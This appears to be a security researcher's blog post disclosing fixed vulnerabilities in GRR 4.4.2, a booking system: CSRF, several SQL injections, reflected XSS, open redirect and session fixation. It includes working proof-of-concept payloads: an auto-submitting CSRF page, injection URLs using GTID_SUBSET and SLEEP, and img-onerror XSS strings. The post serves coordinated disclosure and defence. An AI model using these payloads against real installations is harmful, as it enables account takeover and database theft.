@@ -1,0 +1,315 @@
+<!DOCTYPE HTML>
+<html>
+  <head> <meta charset="utf-8" />
+<meta name="generator" content="Docutils 0.22.3: https://docutils.sourceforge.io/" />
+<title>Breakpoint: A security audit of GRR</title>
+    <link rel="stylesheet" type="text/css" href="../style/base.css"/>
+    <link rel="stylesheet" type="text/css" href="../style/pygments.css"/>
+    <link rel="stylesheet" type="text/css" href="../style/math.css"/>
+
+    <link rel="icon" href="../image/favicon.ico" type="image/x-icon"/>
+
+    <link rel="alternate" type="application/rss+xml" title="Breakpoint RSS" href="../rss.xml"/>
+    <link rel="alternate" type="application/rss+xml" title="Stream of Consciousness RSS" href="../soc_rss.xml"/>
+    <!--
+        The RSS icon used in this page is derived from https://www.flaticon.com/free-icon/rss-feed-symbol_110
+        made by https://www.flaticon.com/authors/freepik. Thank you for providing quality, open work.
+    -->
+  </head>
+  <body>
+    <header class="site-header">
+      <div class="site-title">
+        <div class="title-text">
+          <h1>Breakpoint</h1>
+          <h2>Stepping through security</h2>
+        </div>
+        <img src="../image/tomoko1.png"/>
+      </div>
+      <div class="wrap">
+
+        <ul>
+          <li>
+              <a href="../index.html">Index</a>
+              <a href="../rss.xml">
+                  <img src="../image/rss.png" />
+              </a>
+          </li>
+          <li><a href="https://github.com/cym13">Github</a></li>
+          <li><a href="../soc.html">SoC</a>
+              <a href="../soc_rss.xml">
+                  <img src="../image/rss.png" />
+              </a>
+          </li>
+          <li><a href="../cve.html">CVE</a></li>
+          <li><a href="../about.html">About</a></li>
+        </ul>
+      </div>
+    </header>
+
+    <div class="content">
+      <section id="a-security-audit-of-grr">
+<h2>A security audit of GRR</h2>
+<p>In November 2025 I decided to have a look at <a class="reference external" href="https://site.devome.com/fr/grr3">GRR</a>, an open-source booking
+management system from a small french team. As is often the case this
+lead to the findings of several important vulnerabilities that have since
+been fixed thanks to the great response by its developers in GRR 4.5.0 which
+is available at <a class="reference external" href="https://github.com/JeromeDevome/GRR">https://github.com/JeromeDevome/GRR</a>.</p>
+<p>The vulnerabilities involve SQL injections, XSS, CSRFs, and more.</p>
+<section id="context">
+<h3>Context</h3>
+<p>The audit was on GRR version 4.4.2 and involved dynamic testing as well as
+source code analysis. There aren't many things that Administrators can't do
+in that application, so I focused on threat models with non-admin attackers.
+Furthermore, administrators have the ability to deploy external modules in
+the system that are made of PHP code, so taking over an admin account gives
+remote code execution on the server. This bumps the risk of attacks such as
+CSRFs and XSS.</p>
+<p>In order to make it easier on the reader, this blog post will be written in
+the present tense, but please keep in mind that all the vulnerabilities have
+since been fixed.</p>
+<ul class="simple">
+<li><p><a class="reference external" href="#v1-cross-site-request-forgery-1">V1: Cross-Site Request Forgery</a></p></li>
+<li><p><a class="reference external" href="#v2-sql-injection-through-editentree-1">V2: SQL injection through editentree</a></p></li>
+<li><p><a class="reference external" href="#v3-sql-injection-in-vuereservation-php-1">V3: SQL injection in vuereservation.php</a></p></li>
+<li><p><a class="reference external" href="#v4-sql-injection-in-session-inc-php-1">V4: SQL injection in session.inc.php</a></p></li>
+<li><p><a class="reference external" href="#v5-reflected-xss-in-editentreetrt-php-1">V5: Reflected XSS in editentreetrt.php</a></p></li>
+<li><p><a class="reference external" href="#v6-reflected-xss-in-maj-php-1">V6: Reflected XSS in maj.php</a></p></li>
+<li><p><a class="reference external" href="#v7-open-redirect-1">V7: Open redirect</a></p></li>
+<li><p><a class="reference external" href="#v8-session-fixation-1">V8: Session Fixation</a></p></li>
+<li><p><a class="reference external" href="#v9-sql-injection-in-report-php-1">V9: SQL injection in report.php</a></p></li>
+</ul>
+</section>
+<section id="v1-cross-site-request-forgery-1">
+<h3>V1: Cross-Site Request Forgery</h3>
+<p><strong>CVSSv4</strong> <a class="reference external" href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N">6.9/Medium</a></p>
+<p>The application has no protection against Cross-Site Request Forgeries
+(CSRF). This is made worse by the fact that the application relies heavily on
+GET requests even for requests that change state on the server side, where
+modern designs would prefer POST or PUT requests. In practice this means that
+there are too many exploitation points to list them all and that their impact
+is very important.</p>
+<p>This can be reproduced by creating a webpage <em>csrf.html</em> containing the
+following:</p>
+<pre class="code html literal-block"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>POC CSRF<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;http://localhost:8000/admin/admin.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;get&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;csrfform&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;p&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;admin_config4&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;motdepasse_backup&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;CSRF OK&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;disable_login&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;no&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;redirection_https&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;no&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;log_mail&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;0&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;ip_autorise&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;horaireconnexionde&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;horaireconnexiona&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;sessionMaxLength&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;60&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;pass_leng&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;8&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;pass_nb_min&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;pass_nb_maj&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;pass_nb_ch&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;pass_nb_sp&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;url_disconnect&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;ok&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Enregistrer&quot;</span><span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="w">
+      </span><span class="nb">document</span><span class="p">.</span><span class="nx">csrfform</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span><span class="w">
+    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></code></pre>
+<p>When this page is loaded, it performs a GET request to <em>admin.php</em> that changes
+the configuration of backups, and in particular sets a specific password
+&quot;CSRF OK&quot;.</p>
+<p>To demonstrate the vulnerability, adjust the URL line 9, log into GRR as an
+administrator then in a separate tab visit <em>csrf.html</em>. You will be
+automatically redirected and can note that the configuration (and in
+particular the password) changed.</p>
+<img alt="../image/grr_csrf.png" src="../image/grr_csrf.png" style="width: 70%;" />
+</section>
+<section id="v2-sql-injection-through-editentree-1">
+<h3>V2: SQL injection through editentree</h3>
+<p><strong>CVSSv4</strong> <a class="reference external" href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N">Score: 7.1/High</a></p>
+<p>A SQL injection is present in <em>functions.inc.php</em>, function
+<em>jQuery_DatePickerTwig</em>, reachable through <em>editentree</em> with the parameter
+<em>id</em>. That injection requires authentication but no admin privilege is
+necessary.</p>
+<p>Here is the impacted source code:</p>
+<pre class="code bash literal-block"><code><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$typeDate</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">'rep_end_'</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'id'</span><span class="o">])){</span><span class="w">
+    </span><span class="nv">$res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>grr_sql_query<span class="o">(</span><span class="s2">&quot;SELECT repeat_id FROM &quot;</span>.TABLE_PREFIX.<span class="s2">&quot;_entry WHERE id=&quot;</span>.<span class="nv">$_GET</span><span class="o">[</span><span class="s1">'id'</span><span class="o">]</span>.<span class="s2">&quot;;&quot;</span><span class="o">)</span><span class="p">;</span></code></pre>
+<p>Using such an injection, it's possible to extract the entire database,
+including password hashe which are, thankfully, hashed with bcrypt in recent
+versions.</p>
+<p>To reproduce, go to the following URL:</p>
+<pre class="literal-block">http://localhost:8000/app.php?p=editentree&amp;id=11%20AND%20GTID_SUBSET(CONCAT(0x717a627a71,(SELECT%20(ELT(5151=5151,1))),0x716b627671),5151)&amp;edit_type=series&amp;day=14&amp;month=11&amp;year=2025&amp;page=jour</pre>
+<p>This displays the following message that demonstrates successful injection:</p>
+<pre class="literal-block">Malformed GTID set specification 'qzbzq1qkbvq'.</pre>
+</section>
+<section id="v3-sql-injection-in-vuereservation-php-1">
+<h3>V3: SQL injection in vuereservation.php</h3>
+<p><strong>CVSSv4</strong> <a class="reference external" href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N">Score: 7.1/High</a></p>
+<p>In <em>reservation/contoleurs/vuereservation.php</em>, if <em>reg_part</em> is set, an
+authenticated SQL injection is possible via <em>$_GET[&quot;reg_participants&quot;]</em>.</p>
+<pre class="code bash literal-block"><code><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">&quot;reg_part&quot;</span><span class="o">]))</span><span class="w">
+</span><span class="o">{</span><span class="w">
+    </span><span class="nv">$reg_participant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>array<span class="o">()</span><span class="p">;</span><span class="w">
+    </span><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">&quot;reg_participant&quot;</span><span class="o">]))</span><span class="w">
+        </span><span class="nv">$reg_participant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'reg_participant'</span><span class="o">]</span><span class="p">;</span><span class="w">
+
+    </span>/*<span class="w"> </span>...<span class="w"> </span>*/<span class="w">
+
+    </span><span class="k">if</span><span class="o">(</span>count<span class="o">(</span><span class="nv">$reg_participant</span><span class="o">)</span>&lt;<span class="o">=</span><span class="nv">$nbParticipantMax</span><span class="o">){</span><span class="w">
+
+        </span>/*<span class="w"> </span>...<span class="w"> </span>*/<span class="w">
+
+        </span><span class="nv">$new_users</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>array_diff<span class="o">(</span><span class="nv">$reg_participant</span>,<span class="w"> </span><span class="nv">$reg_users</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>à<span class="w"> </span>inscrire,<span class="w"> </span>ne<span class="w"> </span>sont<span class="w"> </span>pas<span class="w"> </span>inscrits<span class="w">
+        </span>foreach<span class="w"> </span><span class="o">(</span><span class="nv">$new_users</span><span class="w"> </span>as<span class="w"> </span><span class="nv">$user</span><span class="o">)</span><span class="w">
+        </span><span class="o">{</span><span class="w">
+            </span><span class="nv">$sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;INSERT INTO &quot;</span>.TABLE_PREFIX.<span class="s2">&quot;_participants (idresa, beneficiaire) values ('</span><span class="nv">$id</span><span class="s2">','</span><span class="nv">$user</span><span class="s2">')&quot;</span><span class="p">;</span></code></pre>
+<p>The consequences are similar to that described in V2.</p>
+<p>I did not take the time to build a POC for that SQL injection.</p>
+</section>
+<section id="v4-sql-injection-in-session-inc-php-1">
+<h3>V4: SQL injection in session.inc.php</h3>
+<p><strong>CVSSv4</strong> <a class="reference external" href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N">Score: 7.1/High</a></p>
+<p>In <em>include/session.inc.php</em>, the referer from the login request as well as
+its user-agent are vulnerable to SQL injections.</p>
+<pre class="code bash literal-block"><code><span class="k">if</span><span class="w"> </span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s2">&quot;HTTP_REFERER&quot;</span><span class="o">]))</span><span class="w">
+    </span><span class="nv">$httpreferer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>substr<span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s2">&quot;HTTP_REFERER&quot;</span><span class="o">]</span>,0,254<span class="o">)</span><span class="p">;</span><span class="w">
+</span><span class="k">else</span><span class="w">
+    </span><span class="nv">$httpreferer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">''</span><span class="p">;</span><span class="w">
+
+</span><span class="k">if</span><span class="w"> </span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$os</span><span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>isset<span class="o">(</span><span class="nv">$brow</span><span class="o">))</span><span class="w">
+    </span><span class="nv">$useragent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$os</span>.<span class="s1">' '</span>.<span class="nv">$brow</span><span class="p">;</span><span class="w">
+</span><span class="k">else</span><span class="w">
+    </span><span class="nv">$useragent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>substr<span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="o">]</span>,0,254<span class="o">)</span><span class="p">;</span><span class="w">
+
+</span><span class="nv">$sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;INSERT INTO &quot;</span>.TABLE_PREFIX.<span class="s2">&quot;_log (LOGIN, START, SESSION_ID, REMOTE_ADDR, USER_AGENT, REFERER, AUTOCLOSE, END) values (
+    '&quot;</span><span class="w"> </span>.<span class="w"> </span>protect_data_sql<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'login'</span><span class="o">])</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;',
+    '&quot;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'start'</span><span class="o">]</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;',
+    '&quot;</span><span class="w"> </span>.<span class="w"> </span>session_id<span class="o">()</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;',
+    '&quot;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'REMOTE_ADDR'</span><span class="o">]</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;',
+    '&quot;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$useragent</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;',
+    '&quot;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$httpreferer</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;',
+    '1',
+    '&quot;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'start'</span><span class="o">]</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;' + interval &quot;</span><span class="w"> </span>.<span class="w"> </span>Settings::get<span class="o">(</span><span class="s2">&quot;sessionMaxLength&quot;</span><span class="o">)</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot; minute
+    )
+;&quot;</span><span class="p">;</span><span class="w">
+</span>grr_sql_query<span class="o">(</span><span class="nv">$sql</span><span class="o">)</span><span class="p">;</span></code></pre>
+<p>Even though this injection is related to the authentication process, the
+injection point is only reached after successful authentication. Its
+consequences are similar to those described in V2.</p>
+<p>To reproduce:</p>
+<ul class="simple">
+<li><p>Connect with a valid user and password, setting the referer to:</p></li>
+</ul>
+<pre class="literal-block">http://localhost:8000/app.php?p=login' RLIKE SLEEP(5) AND 'nVvx'='nVvx</pre>
+<ul class="simple">
+<li><p>The response should present a noticeable delay, showcasing the
+vulnerability.</p></li>
+</ul>
+</section>
+<section id="v5-reflected-xss-in-editentreetrt-php-1">
+<h3>V5: Reflected XSS in editentreetrt.php</h3>
+<p><strong>CVSSv4</strong> <a class="reference external" href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:H/SA:N">Score: 6.2/Medium</a></p>
+<p>There's a reflected XSS when editing bookings through <em>/app.php?p=editentreetrt</em>,
+in the conflict management page.</p>
+<pre class="literal-block">http://localhost:8000/app.php?p=editentreetrt&amp;oldRessource=1&amp;rep_id=0&amp;edit_type=%27%22%3E%3Cimg%20src=x%20onerror=confirm(174917)%20x=&amp;page=jour&amp;room_back=1&amp;page_ret=&amp;create_by=ADMINISTRATEUR&amp;type_affichage_reser=0&amp;id=14&amp;beneficiaire=ADMINISTRATEUR&amp;benef_ext_nom=&amp;benef_ext_email=&amp;name=auieuie&amp;description=description&amp;start_day=03&amp;start_month=11&amp;start_year=2025&amp;start_=08:30&amp;duration=30&amp;dur_units=minutes&amp;areas=1&amp;rooms[]=1&amp;type=B&amp;nbparticipantmax=0&amp;rep_type=1&amp;rep_num_weeks=1&amp;rep_month=3&amp;rep_month_abs1=0&amp;rep_month_abs2=1&amp;rep_end_day=03&amp;rep_end_month=11&amp;rep_end_year=2025</pre>
+<img alt="../image/grr_xss_editentree.png" src="../image/grr_xss_editentree.png" style="width: 80%;" />
+<p>Multiple parameters present that XSS:</p>
+<ul class="simple">
+<li><p>edit_type</p></li>
+<li><p>page_ret</p></li>
+<li><p>name</p></li>
+<li><p>description</p></li>
+<li><p>start_</p></li>
+<li><p>duration</p></li>
+<li><p>dur_units</p></li>
+<li><p>rooms[]</p></li>
+<li><p>type</p></li>
+</ul>
+<p>Reflected XSS are dangerous because if an authenticated user accesses that
+URL (for example through phishing), that allows the attacker remote code
+execution in the victim's web browser using the victim's privileges. The
+attacker can do anything in the application that the victim could. This is
+obviously especially dangerous if administrators are targeted.</p>
+</section>
+<section id="v6-reflected-xss-in-maj-php-1">
+<h3>V6: Reflected XSS in maj.php</h3>
+<p><strong>CVSSv4</strong> <a class="reference external" href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:H/SA:N">Score: 6.2/Medium</a></p>
+<p>A reflected XSS is present in <em>forcemaj</em> from <em>/installation/maj.php</em>.</p>
+<pre class="literal-block">http://localhost:8000/installation/maj.php?forcemaj=0400008%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%2827892%29%20x%3D</pre>
+<img alt="../image/grr_xss_maj.png" src="../image/grr_xss_maj.png" style="width: 80%;" />
+<p>That XSS can be reached even with unauthenticated users, but it relies on
+setup-related files that may have been removed after deployment.</p>
+</section>
+<section id="v7-open-redirect-1">
+<h3>V7: Open redirect</h3>
+<p><strong>CVSSv4</strong> <a class="reference external" href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N">Score: 5.1/Medium</a></p>
+<p>Open redirects are vulnerabilities where an attacker can manipulate the page
+to which a user is redirected. This is useful for phishing as it provides a
+trusted initial domain that then redirects to a credential harvesting page
+for example. It also allows circumventing SameSite to perform GET CSRF
+attacks as the final request comes from the website itself.</p>
+<p>The URL is: <a class="reference external" href="http://localhost:8000/app.php?p=login&amp;url=https%3A//example.com">http://localhost:8000/app.php?p=login&amp;url=https%3A//example.com</a></p>
+<p>Completing the login process will see the user redirected to the specified
+URL.</p>
+</section>
+<section id="v8-session-fixation-1">
+<h3>V8: Session Fixation</h3>
+<p><strong>CVSSv4</strong> <a class="reference external" href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N">Score: 4.8/Medium</a></p>
+<p>The session cookie is not reset upon login or logout. This allows a session
+fixation attack where the attacker gains knowledge of the session cookie
+before it's provided to the victim. Here is an illustrative scenario:</p>
+<ul class="simple">
+<li><p>Let's say Eve is a student in a university that uses GRR for room booking</p></li>
+<li><p>Eve knows that one of the shared computers from the common room is often
+used to access GRR. She goes to <a class="reference external" href="http://grr.univ.fr">http://grr.univ.fr</a> and a cookie is provided
+to her browser session. She doesn't even need to log in.</p></li>
+<li><p>Eve takes note of the session cookie and goes somewhere near with her
+laptop. She leaves open the web browser on GRR's login page.</p></li>
+<li><p>Alice needs to book a room and decides to use that computer. She logs in.
+Normally, a new cookie should be generated for her session, but in GRR this
+is not the case: she's using the very cookie Eve took note of.</p></li>
+<li><p>While that happens, Eve puts the cookie in her web browser and, once Alice
+is connected, loads GRR. Since the cookie is linked to Alice's session now,
+Eve is logged in as Alice.</p></li>
+<li><p>Alice logs out and leaves her place to Bob who logs in. The cookie is still
+unchanged. Eve reloads the page: she's now connected as Bob.</p></li>
+</ul>
+<p>As we can see, that attack is powerful if the right conditions are met, but
+the most common exploitation scenarios imply physical access to the computer
+used by the victim which severely reduces its usability.</p>
+</section>
+<section id="v9-sql-injection-in-report-php-1">
+<h3>V9: SQL injection in report.php</h3>
+<p><strong>CVSSv4</strong> <a class="reference external" href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N">Score: 7.1/High</a></p>
+<p>In <em>reservation/modeles/report.php</em>, line 247, we can read:</p>
+<pre class="code bash literal-block"><code><span class="nv">$premiere_cellule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>grr_sql_query1<span class="o">(</span><span class="s2">&quot;SELECT fieldname FROM &quot;</span>.TABLE_PREFIX.<span class="s2">&quot;_overload WHERE id='&quot;</span>.<span class="nv">$_GET</span><span class="o">[</span><span class="s2">&quot;sumby&quot;</span><span class="o">]</span>.<span class="s2">&quot;'&quot;</span><span class="o">)</span><span class="p">;</span></code></pre>
+<p>The parameter <em>$_GET[&quot;sumby&quot;]</em> is used without being escaped, leading to an
+SQL injection exploitable from a low-privilege account.</p>
+<p>That SQL injection is presented last because its discovery followed the
+initial report, but it was also fixed in version 4.5.0.</p>
+</section>
+<section id="timeline">
+<h3>Timeline</h3>
+<ul class="simple">
+<li><p>2025-11-06: Initial report communicated to Team Devome</p></li>
+<li><p>2026-01-15: Review of the fixes, some corrections</p></li>
+<li><p>2026-01-18: Last changes are implemented in 4.5.0 RC2</p></li>
+<li><p>2026-02-11: Publication of the vulnerabilities</p></li>
+</ul>
+</section>
+</section>
+    </div>
+    <footer "class"="site-footer">
+      <div "class"="publication_date">
+        First published: 
+      </div>
+    </footer>
+  </body>
+</html>
